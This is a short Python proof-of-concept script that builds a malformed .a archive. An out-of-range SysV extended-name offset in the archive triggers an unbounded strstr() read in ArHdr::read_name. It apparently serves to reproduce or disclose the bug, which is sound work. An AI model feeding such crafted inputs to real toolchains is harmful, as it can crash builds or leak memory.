#!/usr/bin/env python3
"""Writes a malformed Unix .a archive containing one member whose SysV-style
extended filename ("/N") has an out-of-range decimal offset N into the
(nonexistent) archive string table, triggering an unbounded strstr() read in
ArHdr::read_name (src/archive-file.cc)."""
import sys


def ar_header(name: str, size: int) -> bytes:
    name = name.ljust(16)[:16]
    date = b"0".ljust(12)
    uid = b"0".ljust(6)
    gid = b"0".ljust(6)
    mode = b"0".ljust(8)
    sz = str(size).ljust(10)
    fmag = b"`\n"
    h = name.encode() + date + uid + gid + mode + sz.encode() + fmag
    assert len(h) == 60
    return h


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.a"
    out = b"!<arch>\n"
    member_data = b"\x00" * 4
    out += ar_header("/999999999", len(member_data))
    out += member_data
    if len(out) % 2:
        out += b"\n"
    with open(out_path, "wb") as f:
        f.write(out)


if __name__ == "__main__":
    main()
